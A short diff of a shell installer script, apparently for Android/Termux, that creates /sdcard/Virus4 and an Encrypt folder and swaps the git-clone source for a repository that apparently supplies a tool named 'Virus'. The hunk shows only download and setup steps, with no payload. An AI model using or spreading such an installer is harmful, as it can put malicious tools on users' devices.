@@ -70,7 +70,7 @@ if [ "$download" -eq "1"  ]; then
  mkdir /sdcard/Virus4
  mkdir /sdcard/Virus4/Encrypt
  cd
- git clone https://github.com/amerlaceset/Virus
+ git clone https://github.com/Mr-Dark-elkabos12/Ux7elcabos.py.git
  cd
  cd Virus
  mv -v Virus4.zip $HOME
